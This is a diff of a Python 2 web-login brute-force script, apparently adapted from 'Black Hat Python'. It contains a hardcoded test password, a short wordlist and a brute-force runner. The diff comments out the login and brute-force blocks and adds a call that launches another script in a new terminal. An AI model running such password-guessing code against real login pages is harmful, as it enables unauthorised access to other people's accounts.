@@ -1,7 +1,7 @@
 import cookielib
 import urllib
 import urllib2
-
+import os
 
 # Store the cookies and create an opener that will hold them
 cj = cookielib.CookieJar()
@@ -26,6 +26,8 @@ payload = {
   'passwd': 'killer'
   }
 
+
+"""
 # Use urllib to encode the payload
 data = urllib.urlencode(payload)
 
@@ -39,7 +41,7 @@ contents = resp.read()
 
 
 error = "Username and password do not match or you do not have an account yet"
-
+"""
 
 """
 From black hat Python
@@ -161,7 +163,7 @@ class BruteParser(HTMLParser):
 
 
 
-
+"""
 words = ["password1", "password2", "killer", "password4", "password5", "pass6", "po", "p12", "xale"]
 #words = ["killer"]
 
@@ -172,3 +174,8 @@ words = [queryQ.put(query) for query in words]
 
 bruter_obj = Bruter(username, queryQ)
 bruter_obj.run_bruteforce()
+
+"""
+
+# run script in another terminal
+os.system("gnome-terminal -e 'bash -c \"python trashlib2.py; exec bash\"'")
